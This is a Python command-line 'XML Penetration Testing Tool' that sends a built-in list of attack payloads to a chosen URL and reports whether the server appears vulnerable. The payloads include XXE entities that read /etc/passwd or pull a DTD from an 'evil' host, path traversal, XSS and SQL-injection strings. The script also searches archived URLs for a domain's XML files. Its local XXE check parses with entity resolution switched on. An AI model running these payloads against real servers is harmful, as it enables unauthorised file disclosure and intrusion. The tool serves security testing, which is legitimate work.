import requests
from lxml import etree
import os
import sys
from colorama import Fore, Style, init
import subprocess

init(autoreset=True)

# Default payloads for testing
DEFAULT_PAYLOADS = [
    '<root><data>&xxe;</data></root>',
    '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>',
    '<root><data>1 OR 1=1</data></root>',
    '<root><data><![CDATA[<malicious>payload</malicious>]]></data></root>',
    '<root><data>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;</data></root>',
    '<!DOCTYPE root [ <!ENTITY test SYSTEM "http://example.com/evil.dtd"> ]><root>&test;</root>',
    '<root><data>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</data></root>',
    '<root><data>../../../../../etc/passwd</data></root>',
    '<root><data>&lt;iframe src="javascript:alert(1)"&gt;</data></root>',
]

def load_custom_payloads():
    file_path = input(f"{Fore.CYAN}Enter the full path to the custom payload file: {Style.RESET_ALL}").strip()
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}‚ùå Error: Payload file does not exist!")
        return None

    with open(file_path, 'r') as file:
        payloads = file.read().splitlines()
    print(f"{Fore.GREEN}‚úÖ Successfully loaded custom payloads.")
    return payloads

def check_well_formedness(xml):
    try:
        etree.fromstring(xml)
        return True
    except etree.XMLSyntaxError as e:
        return f"Malformed XML: {e}"

def test_xxe(payload):
    try:
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        etree.fromstring(payload, parser)
        return True
    except Exception as e:
        return False

def send_payload(target_url, headers, payload):
    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=5)
        return response
    except Exception as e:
        return f"Error sending payload: {e}"

def display_poc(payload, response, vulnerability_type):
    print(f"\n{Fore.RED}[VULNERABLE] {vulnerability_type} Detected!")
    print(f"{Fore.YELLOW}  Payload Used:\n{payload}")
    print(f"{Fore.CYAN}  Server Response:")
    print(f"    Status Code: {response.status_code}")
    print(f"    Headers: {response.headers}")
    print(f"    Body: {response.text[:300]}...")

def test_xml(target, target_type, payloads):
    print(f"{Fore.CYAN}üîç Starting Penetration Testing for Target: {target_type} - {target}")

    headers = {"Content-Type": "application/xml"}
    for i, payload in enumerate(payloads, start=1):
        print(f"\n{Fore.YELLOW}[Payload {i}] Testing with payload:\n{payload}\n")

        well_formed = check_well_formedness(payload)
        if well_formed is True:
            print(f"  {Fore.GREEN}Well-formedness Check: Passed")
        else:
            print(f"  {Fore.RED}Well-formedness Check: {well_formed}")

        xxe_result = test_xxe(payload)
        if xxe_result:
            print(f"  {Fore.RED}XXE Test Result: Vulnerable!")
        else:
            print(f"  {Fore.GREEN}XXE Test Result: Safe")

        if target_type == "URL":
            response = send_payload(target, headers, payload)
            if isinstance(response, str):
                print(f"  {Fore.RED}Error: {response}")
            else:
                print(f"  {Fore.BLUE}Server Response: {response.status_code}")

                if "passwd" in response.text or "malicious" in response.text:
                    display_poc(payload, response, "XXE/File Disclosure")
                elif "alert(1)" in response.text or "script" in response.text:
                    display_poc(payload, response, "XSS")
                elif "1=1" in response.text:
                    display_poc(payload, response, "SQL Injection")
                else:
                    print(f"  {Fore.GREEN}No vulnerability detected in server response.")

        print("-" * 50)

    print(f"\n{Fore.CYAN}‚úÖ Testing Completed!")

def load_xml_file():
    file_path = input(f"{Fore.CYAN}Enter the full path to the XML file: {Style.RESET_ALL}").strip()
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}‚ùå Error: File does not exist!")
        return None

    with open(file_path, 'r') as file:
        content = file.read()
    print(f"{Fore.GREEN}‚úÖ Successfully loaded XML file.")
    return content

def search_waybackurls(domain):
    print(f"{Fore.CYAN}üîç Searching Wayback Machine for XML files on domain: {domain}")

    try:
        process = subprocess.Popen(
            ["waybackurls", domain], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(f"{Fore.RED}‚ùå Error running waybackurls: {stderr.decode().strip()}")
            return

        urls = stdout.decode().splitlines()
        xml_urls = [url for url in urls if url.endswith(".xml")]

        if not xml_urls:
            print(f"{Fore.YELLOW}No XML files found on Wayback Machine for domain {domain}.")
            return

        print(f"{Fore.GREEN}‚úÖ Found {len(xml_urls)} XML files. Displaying live:")
        for index, url in enumerate(xml_urls, start=1):
            print(f"{Fore.CYAN}[{index}] {url}")

    except FileNotFoundError:
        print(f"{Fore.RED}‚ùå waybackurls is not installed or not found in PATH.")
        print(f"{Fore.YELLOW}Install waybackurls with: go install github.com/tomnomnom/waybackurls@latest")
    except Exception as e:
        print(f"{Fore.RED}‚ùå Error: {e}")

def main_menu():
    while True:
        print(f"\n{Fore.BLUE}{Style.BRIGHT}Welcome to {Fore.CYAN}XML Penetration Testing Tool{Fore.YELLOW} By Malik Hamza! üöÄ{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'=' * 50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Choose input type:{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}1.{Fore.WHITE} Load XML from a file{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}2.{Fore.WHITE} Test a URL endpoint{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}3.{Fore.WHITE} Search for XML files using Wayback Machine{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}4.{Fore.WHITE} Exit the tool{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'=' * 50}{Style.RESET_ALL}")
        choice = input(f"{Fore.CYAN}Enter your choice (1, 2, 3, or 4): {Style.RESET_ALL}").strip()

        if choice == "1" or choice == "2":
            if choice == "1":
                target = load_xml_file()
                target_type = "File"
            else:
                target = input(f"{Fore.CYAN}Enter the target URL for testing: {Style.RESET_ALL}").strip()
                target_type = "URL"

            if target:
                print(f"{Fore.GREEN}{'=' * 50}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Choose payload type:{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}1.{Fore.WHITE} Use default payloads{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}2.{Fore.WHITE} Use custom payloads from a file{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'=' * 50}{Style.RESET_ALL}")
                payload_choice = input(f"{Fore.CYAN}Enter your choice (1 or 2): {Style.RESET_ALL}").strip()

                if payload_choice == "1":
                    payloads = DEFAULT_PAYLOADS
                elif payload_choice == "2":
                    payloads = load_custom_payloads()
                    if not payloads:
                        continue
                else:
                    print(f"{Fore.RED}‚ùå Invalid choice for payload type!")
                    continue

                test_xml(target, target_type, payloads)

        elif choice == "3":
            domain = input(f"{Fore.CYAN}Enter the domain to search for XML files (e.g., example.com): {Style.RESET_ALL}").strip()
            if domain:
                search_waybackurls(domain)

        elif choice == "4":
            print(f"{Fore.GREEN}Exiting the tool. Goodbye!")
            sys.exit(0)
        else:
            print(f"{Fore.RED}‚ùå Invalid choice! Please select 1, 2, 3, or 4.")

if __name__ == "__main__":
    main_menu()
